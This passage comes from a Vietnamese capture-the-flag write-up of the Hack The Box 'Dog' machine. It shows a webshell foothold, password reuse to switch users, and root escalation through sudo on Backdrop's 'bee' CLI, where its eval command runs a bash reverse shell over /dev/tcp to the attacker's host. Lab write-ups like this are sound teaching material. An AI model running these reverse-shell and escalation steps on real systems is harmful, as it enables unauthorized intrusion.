+<p>Một lưu ý nhỏ ở đây là webshell có bị mất sau 1 lúc sử dụng, chỉ cần install lại modules như các bước ở trên là dùng tiếp được bình thường.</p>
+<p>Bật listener với port 9001</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ nc -lnvp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.135<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.58<span class="o">]</span> <span class="m">54348</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>889<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@dog:/var/www/html/modules/shell$
+</span></span><span class="line"><span class="cl">www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class="line"><span class="cl">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span class="line"><span class="cl">fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
+</span></span><span class="line"><span class="cl">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span class="line"><span class="cl">mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
+</span></span><span class="line"><span class="cl">_laurel:x:997:997::/var/log/laurel:/bin/false
+</span></span><span class="line"><span class="cl">www-data@dog:/var/www/html/modules/shell$ ls -la /home
+</span></span><span class="line"><span class="cl">ls -la /home
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> root       root       <span class="m">4096</span> Aug <span class="m">15</span>  <span class="m">2024</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">19</span> root       root       <span class="m">4096</span> Feb  <span class="m">7</span> 18:31 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> jobert     jobert     <span class="m">4096</span> Feb  <span class="m">7</span> 15:59 jobert
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> johncusack johncusack <span class="m">4096</span> Feb  <span class="m">7</span> 15:59 johncusack</span></span></code></pre></div></div>
+<p>Hiện tại tôi có 2 user <em>jobert</em> và <em>johncusack</em>, theo như trong file passwd thì permission của <em>jobert</em> cao hơn.</p>
+<p>Tôi sẽ thử password tôi đã có với cả 2 user này.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@dog:/var/www/html/modules/shell$ su jobert
+</span></span><span class="line"><span class="cl">su jobert
+</span></span><span class="line"><span class="cl">Password: BackDropJ*******DS2024
+</span></span><span class="line"><span class="cl">su: Authentication failure
+</span></span><span class="line"><span class="cl">www-data@dog:/var/www/html/modules/shell$ su johncusack
+</span></span><span class="line"><span class="cl">su johncusack
+</span></span><span class="line"><span class="cl">Password: BackDropJ*******DS2024
+</span></span><span class="line"><span class="cl">shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>johncusack<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>johncusack<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>johncusack<span class="o">)</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~$ ssh johncusack@10.10.11.58                                         
+</span></span><span class="line"><span class="cl">johncusack@10.10.11.58<span class="err">&#39;</span>s password:
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-208-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Tue <span class="m">15</span> Apr <span class="m">2025</span> 09:44:21 AM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:           0.02
+</span></span><span class="line"><span class="cl">  Usage of /:            48.2% of 6.32GB
+</span></span><span class="line"><span class="cl">  Memory usage:          24%
+</span></span><span class="line"><span class="cl">  Swap usage:            0%
+</span></span><span class="line"><span class="cl">  Processes:             <span class="m">242</span>
+</span></span><span class="line"><span class="cl">  Users logged in:       <span class="m">1</span>
+</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> eth0: 10.10.11.58
+</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:7f76
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Ubuntu system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span class="line"><span class="cl">applicable law.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Tue Apr <span class="m">15</span> 08:43:27 <span class="m">2025</span> from 10.10.14.58
+</span></span><span class="line"><span class="cl">johncusack@dog:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">johncusack@dog:~$</span></span></code></pre></div></div>
+
+<h2 class="relative group">Privilege escalation
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><code>sudo -l</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> johncusack:
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> johncusack on dog:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User johncusack may run the following commands on dog:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/local/bin/bee</span></span></code></pre></div></div>
+<p>Tìm hiểu thông tin về thằng bee này</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ strings /usr/local/bin/bee
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env php</span>
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"> * @file
+</span></span><span class="line"><span class="cl"> * A <span class="nb">command</span> line utility <span class="k">for</span> Backdrop CMS.
+</span></span><span class="line"><span class="cl">// Exit gracefully with a meaningful message <span class="k">if</span> installed within a web
+</span></span><span class="line"><span class="cl">// accessible location and accessed in the browser.
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>!bee_is_cli<span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> bee_browser_load_html<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  die<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">// Set custom error handler.
+</span></span><span class="line"><span class="cl">set_error_handler<span class="o">(</span><span class="s1">&#39;bee_error_handler&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">// Include files.
+</span></span><span class="line"><span class="cl">require_once __DIR__ . <span class="s1">&#39;/includes/miscellaneous.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once __DIR__ . <span class="s1">&#39;/includes/command.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once __DIR__ . <span class="s1">&#39;/includes/render.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once __DIR__ . <span class="s1">&#39;/includes/filesystem.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once __DIR__ . <span class="s1">&#39;/includes/input.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">require_once __DIR__ . <span class="s1">&#39;/includes/globals.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">// Main execution code.
+</span></span><span class="line"><span class="cl">bee_initialize_server<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">bee_parse_input<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">bee_initialize_console<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">bee_process_command<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">bee_print_messages<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">bee_display_output<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">exit<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * Custom error handler <span class="k">for</span> <span class="sb">`</span>bee<span class="sb">`</span>.
+</span></span><span class="line"><span class="cl"> * @param int <span class="nv">$error_level</span>
+</span></span><span class="line"><span class="cl"> *   The level of the error.
+</span></span><span class="line"><span class="cl"> * @param string <span class="nv">$message</span>
+</span></span><span class="line"><span class="cl"> *   Error message to output to the user.
+</span></span><span class="line"><span class="cl"> * @param string <span class="nv">$filename</span>
+</span></span><span class="line"><span class="cl"> *   The file that the error came from.
+</span></span><span class="line"><span class="cl"> * @param int <span class="nv">$line</span>
+</span></span><span class="line"><span class="cl"> *   The line number the error came from.
+</span></span><span class="line"><span class="cl"> * @param array <span class="nv">$context</span>
+</span></span><span class="line"><span class="cl"> *   An array of all variables from where the error was triggered.
+</span></span><span class="line"><span class="cl"> * @see https://www.php.net/manual/en/function.set-error-handler.php
+</span></span><span class="line"><span class="cl"> * @see _backdrop_error_handler<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> bee_error_handler<span class="o">(</span><span class="nv">$error_level</span>, <span class="nv">$message</span>, <span class="nv">$filename</span>, <span class="nv">$line</span>, array <span class="nv">$context</span> <span class="o">=</span> NULL<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  require_once __DIR__ . <span class="s1">&#39;/includes/errors.inc&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  _bee_error_handler_real<span class="o">(</span><span class="nv">$error_level</span>, <span class="nv">$message</span>, <span class="nv">$filename</span>, <span class="nv">$line</span>, <span class="nv">$context</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * Detects whether the current script is running in a command-line environment.
+</span></span><span class="line"><span class="cl"><span class="k">function</span> bee_is_cli<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">(</span>empty<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="o">])</span> <span class="o">&amp;&amp;</span> <span class="o">(</span>php_sapi_name<span class="o">()</span> <span class="o">==</span> <span class="s1">&#39;cli&#39;</span> <span class="o">||</span> <span class="o">(</span>is_numeric<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argc&#39;</span><span class="o">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argc&#39;</span><span class="o">]</span> &gt; 0<span class="o">)))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> * Return the HTML to display <span class="k">if</span> this page is loaded in the browser.
+</span></span><span class="line"><span class="cl"> * @return string
+</span></span><span class="line"><span class="cl"> *   The concatentated html to display.
+</span></span><span class="line"><span class="cl"><span class="k">function</span> bee_browser_load_html<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  // Set the title to use in h1 and title elements.
+</span></span><span class="line"><span class="cl">  <span class="nv">$title</span> <span class="o">=</span> <span class="s2">&#34;Bee Gone!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  // Place a white block over <span class="s2">&#34;#!/usr/bin/env php&#34;</span> as this is output before
+</span></span><span class="line"><span class="cl">  // anything <span class="k">else</span>.
+</span></span><span class="line"><span class="cl">  <span class="nv">$browser_output</span> <span class="o">=</span> <span class="s2">&#34;&lt;div style=&#39;background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;&#39;&gt;&amp;nbsp;&lt;/div&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  // Add the bee logo and style appropriately.
+</span></span><span class="line"><span class="cl">  <span class="nv">$browser_output</span> .<span class="o">=</span> <span class="s2">&#34;&lt;img src=&#39;./images/bee.png&#39; align=&#39;right&#39; width=&#39;150&#39; height=&#39;157&#39; style=&#39;max-width:100%;margin-top:3rem;&#39;&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  // Add meaningful text.
+</span></span><span class="line"><span class="cl">  <span class="nv">$browser_output</span> .<span class="o">=</span> <span class="s2">&#34;&lt;h1 style=&#39;font-family:Tahoma;&#39;&gt;</span><span class="nv">$title</span><span class="s2">&lt;/h1&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$browser_output</span> .<span class="o">=</span> <span class="s2">&#34;&lt;p style=&#39;font-family:Verdana;&#39;&gt;Bee is a command line tool only and will not work in the browser.&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  // Add the document title using javascript when the window loads.
+</span></span><span class="line"><span class="cl">  <span class="nv">$browser_output</span> .<span class="o">=</span> <span class="s2">&#34;&lt;script&gt;window.onload = function(){document.title=&#39;</span><span class="nv">$title</span><span class="s2">&#39;;}&lt;/script&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  // Output the combined string.
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nv">$browser_output</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>Ở dòng đâu tiên đã cung cấp cho tôi biết đây là 1 CLI của Backdrop CMS. Đi hỏi Chatgpt thì nó đưa cho tôi 1 số gợi ý về việc leo thang đặc quyền dựa vào thằng bee này. Đầu tiên là xem và phân tích các options của nó</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ sudo /usr/local/bin/bee <span class="nb">help</span>
+</span></span><span class="line"><span class="cl">🐝 Bee
+</span></span><span class="line"><span class="cl">Usage: bee <span class="o">[</span>global-options<span class="o">]</span> &lt;command&gt; <span class="o">[</span>options<span class="o">]</span> <span class="o">[</span>arguments<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Global Options:
+</span></span><span class="line"><span class="cl"> --root
+</span></span><span class="line"><span class="cl"> Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> --site
+</span></span><span class="line"><span class="cl"> Specify the directory name or URL of the Backdrop site to use <span class="o">(</span>as defined in <span class="s1">&#39;sites.php&#39;</span><span class="o">)</span>. If not set, will try to find the Backdrop site automatically based on the current directory.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> --base-url
+</span></span><span class="line"><span class="cl"> Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> --yes, -y
+</span></span><span class="line"><span class="cl"> Answer <span class="s1">&#39;yes&#39;</span> to questions without prompting.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> --debug, -d
+</span></span><span class="line"><span class="cl"> Enables <span class="s1">&#39;debug&#39;</span> mode, in which <span class="s1">&#39;debug&#39;</span> and <span class="s1">&#39;log&#39;</span> <span class="nb">type</span> messages will be displayed <span class="o">(</span>in addition to all other messages<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">.....</span></span></code></pre></div></div>
+<p>Đưa hết phần help này cho ChatGPT thì nó đưa ra cho tôi gợi ý về option <code>eval</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ sudo /usr/local/bin/bee <span class="nb">help</span> <span class="p">|</span> grep <span class="nb">eval</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">eval</span>
+</span></span><span class="line"><span class="cl">   ev, php-eval</span></span></code></pre></div></div>
+<p>Tôi có thể thực thi mã PHP tùy ý với quyền <code>root</code> sau khi bootstrap Backdrop.</p>
+<p>Đọc thêm về <a href="https://github.com/backdrop-contrib/bee/blob/1.x-1.x/docs/Usage.md#eval"  target="_blank" rel="noreferrer">eval</a>, tôi sẽ thử câu lệnh execute shell</p>
+<p><code>sudo /usr/local/bin/bee eval 'shell_exec(&quot;/bin/bash -c \'bash -i &gt;&amp; /dev/tcp/10.10.14.135/4444 0&gt;&amp;1\'&quot;);'</code></p>
+<p>Bật listener với port 4444 trước khi chạy payload</p>
+<p><code>nc -lnvp 4444</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ sudo /usr/local/bin/bee <span class="nb">eval</span> <span class="s1">&#39;shell_exec(&#34;/bin/bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.135/4444 0&gt;&amp;1\&#34;&#34;);&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ✘  The required bootstrap level <span class="k">for</span> <span class="s1">&#39;eval&#39;</span> is not ready.</span></span></code></pre></div></div>
+<p>Tuy nhiên bên shell của tôi lại hiện lỗi</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~$ nc -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.135<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.58<span class="o">]</span> <span class="m">33130</span>
+</span></span><span class="line"><span class="cl">-bash: 1<span class="s2">&#34;);: ambiguous redirect</span></span></span></code></pre></div></div>
+<p>Quay ra hỏi ChatGPT thì nó bảo</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="six"
+    width="1517"
+    height="504"
+    src="/ctf/hackthebox/dog/6_hu_d6fe7ce23517ff5e.png"
+    srcset="/ctf/hackthebox/dog/6_hu_d6fe7ce23517ff5e.png 800w, /ctf/hackthebox/dog/6_hu_d43eebf8ada2af84.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/dog/6.png"></figure>
+<p>Tóm lại cách sửa là tôi phải tìm thư mục mã nguồn của Backdrop, nơi chứa file <code>settings.php</code> và đặt nó thành <code>--root</code> và đặt <code>--site</code> thành default</p>
+<p>Tìm thư mục chứa <code>settings.php</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ ll /var/www/
+</span></span><span class="line"><span class="cl">total <span class="m">12</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root     root     <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> ./
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">13</span> root     root     <span class="m">4096</span> Aug <span class="m">15</span>  <span class="m">2024</span> ../
+</span></span><span class="line"><span class="cl">drwxrwxr-x  <span class="m">9</span> www-data www-data <span class="m">4096</span> Apr <span class="m">15</span> 07:45 html/
+</span></span><span class="line"><span class="cl">johncusack@dog:~$ ll /var/www/html/
+</span></span><span class="line"><span class="cl">total <span class="m">904</span>
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">9</span> www-data www-data   <span class="m">4096</span> Apr <span class="m">15</span> 07:45 ./
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root     root       <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> ../
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">9</span> www-data www-data   <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> core/
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">8</span> www-data www-data   <span class="m">4096</span> Apr <span class="m">15</span> 13:39 files/
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">8</span> root     root       <span class="m">4096</span> Feb  <span class="m">7</span> 21:22 .git/
+</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> www-data www-data    <span class="m">578</span> Mar  <span class="m">7</span>  <span class="m">2024</span> index.php*
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">2</span> www-data www-data   <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> layouts/
+</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> www-data www-data  <span class="m">18092</span> Mar  <span class="m">7</span>  <span class="m">2024</span> LICENSE.txt*
+</span></span><span class="line"><span class="cl">-rw-rw-rw- <span class="m">1</span> www-data www-data <span class="m">824745</span> Oct <span class="m">18</span> 03:45 linpeas.sh
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">2</span> www-data www-data   <span class="m">4096</span> Apr <span class="m">15</span> 13:42 modules/
+</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> www-data www-data   <span class="m">5285</span> Mar  <span class="m">7</span>  <span class="m">2024</span> README.md*
+</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> www-data www-data   <span class="m">1198</span> Mar  <span class="m">7</span>  <span class="m">2024</span> robots.txt*
+</span></span><span class="line"><span class="cl">-rwxrwx--- <span class="m">1</span> www-data www-data  <span class="m">21732</span> Jul  <span class="m">8</span>  <span class="m">2024</span> settings.php*
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">2</span> www-data www-data   <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> sites/
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">2</span> www-data www-data   <span class="m">4096</span> Jul  <span class="m">8</span>  <span class="m">2024</span> themes/</span></span></code></pre></div></div>
+<p>Sửa lại payload và chạy nó trên máy victim. Tất nhiên là trước đó phải bật lại listener</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">johncusack@dog:~$ sudo /usr/local/bin/bee --root<span class="o">=</span>/var/www/html --site<span class="o">=</span>default <span class="nb">eval</span> <span class="s1">&#39;shell_exec(&#34;/bin/bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.135/4444 0&gt;&amp;1\&#34;&#34;);&#39;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~$ nc -lvnp <span class="m">4444</span>                                                                                                                                    <span class="m">1</span> ↵
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.135<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.58<span class="o">]</span> <span class="m">35856</span>
+</span></span><span class="line"><span class="cl">root@dog:/var/www/html# id
+</span></span><span class="line"><span class="cl">id
